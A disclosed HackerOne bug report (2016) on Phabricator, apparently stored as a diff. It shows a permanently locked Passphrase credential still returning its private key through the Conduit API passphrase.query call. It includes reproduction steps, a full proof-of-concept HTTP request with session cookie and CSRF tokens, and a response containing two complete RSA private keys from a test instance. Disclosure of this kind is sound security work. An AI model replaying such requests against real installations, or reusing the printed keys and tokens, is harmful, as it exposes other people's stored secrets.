@@ -1,0 +1,56 @@
+ReportLink:https://hackerone.com/reports/139626
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/vorpal
+ReportedTo:Phabricator(phabricator)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:18.05.2016 22:01:14
+
+Summary:
+
+mongoose :D
+
+Testing was performed on our own installed testing environment, with a standard installation and configuration of Phabricator.
+
+The Passphrase application has feature where stored credentials can be locked. When you lock a credential, it claims "This credential will be locked and the secret will be hidden forever. Anything relying on this credential will still function. This operation can not be undone." 
+
+However, it turns out that the secret can still be disclosed through the Conduit API, using the same user account.
+
+Steps to reproduce:
+
+1. Logged in as a normal, unprivileged user.
+2. Created a stored credential of type "ssh-generated-key."
+3. Locked the credential permanently by clicking "Lock Permanently" and confirming the dialog box.
+4. Clicked "Allow Conduit Access" and confirmed it in the dialog.
+5. Issued the following HTTP request:
+
+```
+POST /api/passphrase.query HTTP/1.1
+Host: phabricator.jaredmichaelsmith.com
+Content-Length: 159
+X-Phabricator-Csrf: B@n2guxmnf7d4b0defd6b5bb5b
+Content-Type: application/x-www-form-urlencoded
+Cookie: phusr=user2; phsid=7apprp5waaae5glptp2d4z5dhr75jxjrghscwl65
+
+__csrf__=B%40wmvs6khg22c07c0c320390dd&__form__=1&__dialog__=1&__submit__=true&__wflow__=true&__ajax__=true&__metablock__=8&needPublicKeys=true&needSecrets=true
+```
+
+This resulted in the following HTTP response containing the original generated private key (among others, which had been generated in the course of testing), which should have been inaccessible to me, because it was locked: 
+
+```
+HTTP/1.1 200 OK
+Date: Wed, 18 May 2016 19:02:27 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.16
+X-Frame-Options: Deny
+Cache-Control: no-store
+Expires: Sat, 01 Jan 2000 00:00:00 GMT
+X-Content-Type-Options: nosniff
+Content-Length: 6211
+Content-Type: application/json
+
+{"result":{"data":{"PHID-CDTL-gwd3irtr6meupa2ynpxu":{"id":"5","phid":"PHID-CDTL-gwd3irtr6meupa2ynpxu","type":"ssh-generated-key","name":"poc-key2","description":"","uri":"http:\/\/phabricator.jaredmichaelsmith.com\/K5","monogram":"K5","username":"poc-user","material":{"publicKey":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDg2qd0tj+8kcjggdtiEbJQMtt58nuyjyW1YWRcY0Q0jrYJg8dPsxz6vp\/8szHmuO90KR15PbDNDN7fSj3ZjG6qcPdc0iI3wqD\/sSt2Rm76TomiXCdoCgy9PfPjDPWMuAbnDtaFR7sHWwrif2KqT\/QQaDcbW+AkY2f0GVMKIacQH4k\/uOD8Yk\/FOYneMxwAEomS80O6k84KCIIXNFMDxRElnlAoKtJLKSZeCrwHawx5A\/rCC4+wUyBSfDntxqoDet3fl4tJ1usAHbCcnpVxuImNemDMdwES2McQ\/lzuG7JqE0xCdcpdXoo5YXP9M4CZ97usHsV6\/jLIC6t+gpwlv6uD\n","noAPIAccess":"This private material for this credential is not accessible via API calls."}},"PHID-CDTL-m4qwhahonzh5hfxpk3id":{"id":"4","phid":"PHID-CDTL-m4qwhahonzh5hfxpk3id","type":"ssh-generated-key","name":"poc-key","description":"","uri":"http:\/\/phabricator.jaredmichaelsmith.com\/K4","monogram":"K4","username":"poc-user","material":{"privateKey":"-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA55MzyR+JjHmI2kIyWMgPrF\/RA2M+7dK5gdIQc3psjy6QAqMb\nBSVcNUXg1Rh3F5+LIm6UVKPeDGwtU\/9rhduuHR\/jJnN+i5XUv7fGh6WIYPfXF4Rd\nMpgqfgg1Vg3fVj3WC0esvkm\/P4a8IIgMyDGA\/DJA1sO+i1xVE4FzqmNlEe2HTQYi\n9Frp\/IkoSa7rxlPMj45QCIlgaN4cuDdgyeCO1uwqMVdSpU\/msCaibB\/phczZAg4V\nhf4bX3V\/rr6vz5xIJhJnACLu4Rr0F7RbGq0TexR2Va2xDP\/wEsgpIVTcCx86BhRu\nsZ6dgBMO8xsRnleVuBc4eADSgobSO7iNN\/0KQQIDAQABAoIBAQDVQ7BmYb\/n+ak5\n78q0DpK4mYlAyG6U0QL8drulzbIabrQ7aYChzZVMjm0PcreCrvCQpiu+gyckY5+f\nAtQ\/8182\/T3RFH4PCM5kPVf9Zknhm32f78two8hGR0LvXFk48DumKb0BhaM2Wtv4\nTbMPzt9N4u3pm11otIC5NPeTjHPw\/AGfmPXcmXSVnVAQFN\/px5GNuWRiLWpoI4SC\nzMikV3NWgAcbzjuQvAdZSYoaDAMEAsR2R0CSPeL92X0HzptEkSWHMPQjgiji4Iuu\nWhT2Ewq9qd2PWu34B9ARjdPxy2KcQbjbR5FYYDaaQOUkISBHqJ8B7+sFsi2kSiWa\nSd6Mq7Z9AoGBAPdx3DUQcivGmHIneg9xXG7gpqtFu8EvrkghImIAph2Xsv6Rrp+a\nmMZFK2PsPvFiJLwClLrUuLELrcPK8+dwNKZUeWjtvwSkaLtb1TcF5bJOrJKz497F\nL+5QL0rTWplS0YK15AUsi5eLAR3ji0gUUA2G7CnSrj9QNgERRQOHBgLjAoGBAO+U\n4ORGyHbArrfd40UUNmCXeYLA\/RmBaaG9qX65WPL4q\/YxfKqDH137ouysQxkHQHbY\n0Uy0tp8zFqCu4Uvw89qRzFF9JSaaXGde0RvGh8LUEXuzKOYqSJx8ogPsuKELpib\/\nfuQthHbT6EmpsNPOAEJV1BI9cyuGvaXRwhEl1POLAoGAEDZvnTJ0qJWci242uyhM\nTB+ADBzHjoLXQnaZUB6Gw82atr9I18BDXkpN64AhJ6OskH0CzbL+XutK+Vck3\/ck\nG\/nQ8qURLPawvgXoVHCYejRZbktHFOOKnmy2jIqIlx8sBwpv5D7k7or3CcRM7e4W\nyKwccSkSradNwoglI3QHWs0CgYEAtHGdMFFfipF1BmbIVa7zhayQiDpyZlNiC7+d\neSSAKf\/BBJwhGQvJBDASdc8IekFL\/Dcw7GTvZthDoqIUbe38vBIzoOxwnrKEBhcT\nx6eveL3grRozI6eVKMd1\/x67sA\/mBFlKaPEfY6AWw+Ramiv9Zfje0R4XMCE7lTh2\nwhOMYCECgYEAmhJeEZE7YdpJf1kPrp+moeP\/0\/SAPqNfrAFhU\/4sKqIM3nYK1kWX\n3Vz1mIX0lOrJVtTFRkWZvZOzQorQ2\/uo1AWQO9B+MQvpKkepnNDJm0YZqrn98hCh\nYluzY3BxDPz4VHt\/MhcwpMkvoCJo3uH+FV8k6mu8mC+tS5VCzuf9Co4=\n-----END RSA PRIVATE KEY-----\n","publicKey":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnkzPJH4mMeYjaQjJYyA+sX9EDYz7t0rmB0hBzemyPLpACoxsFJVw1ReDVGHcXn4sibpRUo94MbC1T\/2uF264dH+Mmc36LldS\/t8aHpYhg99cXhF0ymCp+CDVWDd9WPdYLR6y+Sb8\/hrwgiAzIMYD8MkDWw76LXFUTgXOqY2UR7YdNBiL0Wun8iShJruvGU8yPjlAIiWBo3hy4N2DJ4I7W7CoxV1KlT+awJqJsH+mFzNkCDhWF\/htfdX+uvq\/PnEgmEmcAIu7hGvQXtFsarRN7FHZVrbEM\/\/ASyCkhVNwLHzoGFG6xnp2AEw7zGxGeV5W4Fzh4ANKChtI7uI03\/QpB\n"}},"PHID-CDTL-khywy2s2kfishddwajpg":{"id":"3","phid":"PHID-CDTL-khywy2s2kfishddwajpg","type":"note","name":"mongoose-note","description":"","uri":"http:\/\/phabricator.jaredmichaelsmith.com\/K3","monogram":"K3","username":"","material":[]},"PHID-CDTL-m2pi42lz6to5metwve2f":{"id":"2","phid":"PHID-CDTL-m2pi42lz6to5metwve2f","type":"note","name":"asdf","description":"asdf","uri":"http:\/\/phabricator.jaredmichaelsmith.com\/K2","monogram":"K2","username":"","material":{"noAPIAccess":"This private material for this credential is not accessible via API calls."}},"PHID-CDTL-fnqpdysl4ksx6xatdtxc":{"id":"1","phid":"PHID-CDTL-fnqpdysl4ksx6xatdtxc","type":"ssh-generated-key","name":"sdf","description":"","uri":"http:\/\/phabricator.jaredmichaelsmith.com\/K1","monogram":"K1","username":"fsdf","material":{"privateKey":"-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEA367J2I5\/kMs3rXyYnZiMdian2B0X9qOD8wljjzGZWCXS5lod\nPe480Y0dCuiuRQmVM3CcVFLUkAPTrn\/0lmVeT56PSiT6MCzMGyOai439Nqe2PGJb\nwzb3NbkNOmpCrpgJoZoUjApABg8TnkuFWGGkFHHHLtXPMROapI9EpXzksN6ay16D\nSe+E0EWc2G3lt6dcdJohfgT0qVg0cuLHeSUryOpfLHDgfpEkrjcGR7fOhi2csh9W\nQDuOyFSLJL1mrZXWE9Qw88IcEjiAkajBOyLdqbXetBWBUmIaBDDHHSif2wxDSTJv\n4uLc\/ZHf3JO9z8L5O+93HfxtR8bpVXnKaklyDQIDAQABAoIBAEUKKfrRYMZMMw81\nGdXqs8\/z9nJZ6H+T0LI+\/5++61mtsv6uacAnvFXhfElVsBRW9No\/s8DDICCjTb7a\nd5\/EAewJQKjd6OrdqNHnl1fjp3grI7BXm4MRgBPw3ghdq98\/xhk++YCP2VsFZETD\ngpDY8k\/tHlFyZNT8\/Ao2vjVl6yA7wSrDQGSQ+b00QQeCZnxACBWvaBhhK+YanEjX\nkdaTNzKpyfdLQ1d8NVmSDo\/C+\/ykg5RmxqpabwpmQY3go6\/C0r7fOBj1Lk6vhO2h\naNZhupsYqwdTSOdjcwJEoKLp8QmW9FOZ1e3iXbZ+Jb0nUntWtLubwTfqJ56a7VVN\nP0q61PECgYEA+WZ4aYY\/c0pw6\/IyBv41XqXbo0pVWoJAcKoIorqbDRas1vkKrQqH\nRMtfmVg6ooM0pnCLRJ5p4O026Z9Hxg7yyCAMUHCT5xRmZ0Nm+y2hNDiazYDRPwoH\n\/HLdv1l+zqldhKrziz5l6LyBnbDA3ltupwJPz0VWosks0HFj3VP8Z2cCgYEA5ZoZ\nI6Nff4yjwtKmZ+31wjPlJXZxB1sACwSWx\/nbMgKq649Qmi7Xv1Ak04ZtR44g5o0t\n34BK9DYRlVHL3nnNZOalAsgpz+Y1Ek4gR9o+Xx3xBfZJkkiZxM3SxAljmpPxFkPB\nVDgM1FnR410ECEX+kKoaAC\/65NwFA3l95eYhtmsCgYAeurR9dBAfWX2+ZLIrUGkt\nB0yfuwn3Q\/NCroCv5EQ0gaW8OyVImvJ91H0r\/MYEvhvfoiBWzRoIn9HTSU\/jpHXf\nmKtLwgNHRqkzcgefTUj+kTbpuUSO+uJvBYwzBojsV8vxC8tETeTqn0dtMZkiDKv+\nofdJd6asGhOOf1oprC5+YwKBgE1NaaNfEPsPrd8dLxuUuYaOFFtdmkaAs+4BuIZR\nsCQRU9yFXvzaQpdN82goPUi3KIqXA9fZCONaBOeCJ6Ka3bVYFjxuie1OM5YbKbEn\nYJKDsS9xsWmH+gWRyqFoC9nyb1wwqbmiOWeRaiIjogTrE\/8+1gw0G0PMc\/+set\/Z\ncIZLAoGAcwrfurKoun3qIHZ8kzCVe8B8meltGBMDkNnjG2Ps+cD647+dF8jXk38k\ntfMECAIA3sMoSmHZBrJmuHiis9i9HEMNyE9bfr0UKwjUaDlYWLAA0jqNLgL+Prq3\neWQEpT9l6cNmdSqS1i0WP+hp+Xc92c1WacDV2h57xSV\/xK\/FLyo=\n-----END RSA PRIVATE KEY-----\n","publicKey":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfrsnYjn+QyzetfJidmIx2JqfYHRf2o4PzCWOPMZlYJdLmWh097jzRjR0K6K5FCZUzcJxUUtSQA9Ouf\/SWZV5Pno9KJPowLMwbI5qLjf02p7Y8YlvDNvc1uQ06akKumAmhmhSMCkAGDxOeS4VYYaQUcccu1c8xE5qkj0SlfOSw3prLXoNJ74TQRZzYbeW3p1x0miF+BPSpWDRy4sd5JSvI6l8scOB+kSSuNwZHt86GLZyyH1ZAO47IVIskvWatldYT1DDzwhwSOICRqME7It2ptd60FYFSYhoEMMcdKJ\/bDENJMm\/i4tz9kd\/ck73Pwvk773cd\/G1HxulVecpqSXIN\n"}}},"cursor":{"limit":100,"after":null,"before":null}},"error_code":null,"error_info":null}
+```
+
+This effectively bypasses the "Lock Permanently" security feature, which claims that "the secret will be hidden forever," because I was able to access the secret after locking it without any additional privileges or credentials. Also, note that Conduit access was enabled *after* the secret was locked.
